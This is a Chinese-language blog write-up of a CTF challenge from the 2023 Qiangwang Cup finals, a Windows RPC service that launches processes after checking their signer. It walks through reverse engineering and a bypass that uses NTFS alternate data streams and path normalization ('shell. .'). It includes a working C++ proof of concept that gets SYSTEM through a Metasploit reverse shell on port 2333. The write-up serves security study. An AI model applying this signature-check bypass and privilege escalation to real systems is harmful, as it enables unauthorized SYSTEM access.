---
title: WinT - 2023 第七届“强网杯”决赛 RPC 本地提权 Review
date: 2024-01-18 23:26:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Windows", "Privilege Escalation", "RPC"]
layout: post
---

前两天强网杯 Final RealWorld 有一个 Windows RPC 本地提权的题目，比赛结束后找朋友要了附件简单复现了一下。不过这个题当时好像还有不少非预期，还有的师傅说看我 “[*Creating Windows Access Tokens With God Privilege*](https://whoamianony.top/posts/creating-windows-access-tokens-with-god-privilege/)” 这篇博客解出来了，但我确实没发现这道题跟 God Privilege 有什么联系。



# Introduction

> *BabyTrust*
>
> *We surely don't trust anonymous nowadays, we only trust ourselves.*

题目中给出了一台 Windows Server 2022 虚拟机和两个附件（server.exe 和 hello.exe）。server.exe 在虚拟机上注册了一个 RPC 服务并以服务的形式自动运行。选手需要对目标 RPC 服务进行漏洞利用，并最终获取操作系统的 SYSTEM 权限。

# Details

## hello.exe

Hello.exe 里面只有一个控制台输出，目前还不知道有什么用，但是后面确实会用到。

![image-20240118231735085](/assets/posts/2024-01-18-wint-2024-qwb-finals-rpc-local-privilege-escalation-review/image-20240118231735085.png)

## server.exe

### main

我们首先来看到 server.exe 的 main 函数，其中通过 RpcServerUseProtseqEpW 和 RpcServerRegisterIf2 函数注册了一个 RPC：

![image-20240115001239154](/assets/posts/2024-01-18-wint-2024-qwb-finals-rpc-local-privilege-escalation-review/image-20240115001239154.png)

注册的 RPC 的协议序列为 ncalrpc，端点为 qwb，我们先将它记录下来，因为后面要用到。

### sub_140001590

sub_140001590 函数为 RPC 函数：

![image-20240115002124620](/assets/posts/2024-01-18-wint-2024-qwb-finals-rpc-local-privilege-escalation-review/image-20240115002124620.png)

在 sub_140001590 中，调用了 NtCreateUserProcess 函数创建进程。该函数是 Windows 操作系统中的一个内部系统调用，是 Native API 的一部分，是 Windows 内核中较低级别的功能，通常不会被普通应用程序直接使用。

> *One of the documented Windows APIs for creating processes is `CreateProcess()`. Using this API, the created process runs in the context (meaning the same access token) of the calling process. Execution then continues with a call to `CreateProcessInternal()`, which is responsible for actually creating the user-mode process. `CreateProcessInternal()` then calls the undocumented and native API `NtCreateUserProcess()` (located in `ntdll.dll`) to shift to kernel-mode.*

我们来看一下 NtCreateUserProcess 的原型：

```c++
NTSTATUS
NTAPI
NtCreateUserProcess(
    _Out_ PHANDLE ProcessHandle,
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK ProcessDesiredAccess,
    _In_ ACCESS_MASK ThreadDesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ProcessObjectAttributes,
    _In_opt_ POBJECT_ATTRIBUTES ThreadObjectAttributes,
    _In_ ULONG ProcessFlags,
    _In_ ULONG ThreadFlags,
    _In_ PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    _Inout_ PPS_CREATE_INFO CreateInfo,
    _In_ PPS_ATTRIBUTE_LIST AttributeList
);
```

可以看到，该函数不接受任何包含要创建的进程的路径的参数，这就是 `ProcessParameters` 参数发挥作用的地方。该参数是一个指向 `RTL_USER_PROCESS_PARAMETERS`  结构体的指针。该结构体描述了要创建的进程的启动参数，而构建则该结构则需要依靠另一个 API：

```c++
NTSTATUS
NTAPI
RtlCreateProcessParametersEx(
    _Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData,
    _In_ ULONG Flags // Pass RTL_USER_PROCESS_PARAMETERS_NORMALIZED to keep parameters normalized
);
```

其中，`pProcessParameters` 参数指向的是 `RTL_USER_PROCESS_PARAMETERS` 结构，
 `ImagePathName` 是启动进程的路径。

在 sub_140001590 函数中，`ImagePathName` 参数由 sub_140001590 的第二个参数传入 `RtlCreateProcessParametersEx`，并最终通过 `RTL_USER_PROCESS_PARAMETERS` 传入 NtCreateUserProcess 函数。因此 NtCreateUserProcess 函数参数启动的进程是可控的。

需要注意的是，NtCreateUserProcess 函数创建进程之后，主线程将挂起，并通过 sub_1400013E0 函数对新创建的进程的主模块的文件名进行检查。只有检查通过后，主线程才会被恢复，否则将终止新创建的线程和进程：

```c++
K32GetModuleFileNameExW(hProcess, 0i64, Filename, 0x104u);
if ( (unsigned int)sub_1400013E0(Filename) )
{
    printf("%ls is verified!\n", Filename);
    ResumeThread(hThread);
    return 0i64;
}
else
{
    printf("%ls is NOT verified!\n", Filename);
    TerminateThread(hThread, 0);
    TerminateProcess(hProcess, 0);
    return 1i64;
}
```

### sub_1400013E0

跟进 `sub_1400013E0` 函数，其调用了 `WinVerifyTrust()` 对获取到的文件名称进行签名验证，如果 `WinVerifyTrust()` 验证成功，并且继续调用 `sub_140001000` 函数：

![image-20240115204728103](/assets/posts/2024-01-18-wint-2024-qwb-finals-rpc-local-privilege-escalation-review/image-20240115204728103.png)

可以看到，该函数通过 `CertGetNameStringW()` 获取签名颁发者名称，并判断颁发者是否为 ”Nonick“，如果是，则最终通过检查。

回顾题目给出的附件，其中 hello.exe 的签名者正好是 ”Nonick“，这肯定在可以绕过签名验证时发挥作用：

<img src="/assets/posts/2024-01-18-wint-2024-qwb-finals-rpc-local-privilege-escalation-review/image-20240115205419284.png" alt="image-20240115205419284" style="zoom:67%;" />

## Step to Exploit

我在进行复现时，滥用了 Windows 的 NTFS ADS（Alternate Data Stream），具体原理可以参考 ”[*Pentester’S Windows NTFS Tricks Collection*](https://sec-consult.com/blog/detail/pentesters-windows-ntfs-tricks-collection/)“ 这篇文章中 ”*Trick 6: Hiding The Process Binary*“ 部分的描述。

在漏洞利用之前，我们需要先生成以下两个文件：

- shell：直接从 hello.exe 拷贝，使其具备 ”Nonick“ 的签名。
- shell. .：MetaSploit 生成的载荷，将在本地 2333 端口反弹 Shell。

如果将 ”shell. .“ 传入 sub_140001590 函数，则经过 `RtlCreateProcessParametersEx` 标准化后，进入 `sub_1400013E0` 进行签名校验的文件名为 ”shell“，而该文件的签名可信，因此将通过检查。

此外，在调用 `NtCreateUserProcess` 函数之前，却将标准化之前的文件名 ”shell. .“ 推入了进程堆，所以最终恢复主线程时，执行的是 ”shell. .“ 这个文件。

因此，该漏洞利用步骤如下：

1. 创建 shell 文件，可以直接从 hello.exe 拷贝，使其具备 ”Nonick“ 的签名。
2. 创建 shell.exe，这是 MetaSploit 生成的载荷，执行后将在本地 2333 端口反弹 Shell。
3. 滥用 NTFS ADS，将 shell.exe 重命名为 ”shell. .“，并与 shell 置于同一个目录中。
4. 启动 nc.exe 监听本地 2333 端口。
5. 调用 RPC 函数 `sub_140001590` 触发 `NtCreateUserProcess` 启动 ”shell. .“ 进程。
6. 本地 2333 端口将获取到 SYSTEM 权限的 CMD。

最简单的 PoC 如下：

```c++
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#include "rpc_h.h"

#pragma comment(lib, "RpcRT4.lib")

int wmain(int argc, wchar_t* argv[])
{
	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	RPC_BINDING_HANDLE hBinding;

	wprintf(L"[*] Copy hello.exe to C:\\Windows\\Temp\\shell\n");
	CopyFileW(L".\\hello.exe", L"C:\\Windows\\Temp\\shell", 0);
	wprintf(L"[*] Copy shell.exe to C:\\Windows\\Temp\\shell. .\n");
	CopyFileW(L".\\shell.exe", L"C:\\Windows\\Temp\\shell. .::$DATA", 0);

	RpcStatus = RpcStringBindingComposeW(
		NULL, 
		(RPC_WSTR)L"ncalrpc", 
		(RPC_WSTR)L"", 
		(RPC_WSTR)L"qwb", 
		NULL, 
		&StringBinding
	);
	if (RpcStatus != RPC_S_OK) {
		wprintf(L"[-] RpcStringBindingComposeW() Error: [%u]\n", GetLastError());
		return 0;
	}

	RpcStatus = RpcBindingFromStringBindingW(
		StringBinding,
		&hBinding
	);
	if (RpcStatus != RPC_S_OK) {
		wprintf(L"[-] RpcBindingFromStringBindingW() Error: [%u]\n", GetLastError());
		return 0;
	}

	RpcStatus = RpcStringFree(
		&StringBinding
	);
	if (RpcStatus != RPC_S_OK) {
		wprintf(L"[-] RpcStringFreeW() Error: [%u]\n", GetLastError());
		return 0;
	}

	RpcTryExcept
	{
		BSTR bShellPath = SysAllocString(L"\\??\\C:\\Windows\\Temp\\shell. .");
		Rpc_GetSystem(hBinding, &bShellPath);
		wprintf(L"[*] NtCreateUserProcess Triggered!");
	}
	RpcExcept(EXCEPTION_EXECUTE_HANDLER);
	{
		wprintf(L"[-] Error: %d\r\n", RpcExceptionCode());
	}
	RpcEndExcept
	{
		RpcBindingFree(&hBinding);
	}
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}
```

# Let’s see it in action

漏洞利用结果如下：

![Animation](/assets/posts/2024-01-18-wint-2024-qwb-finals-rpc-local-privilege-escalation-review/Animation.gif)
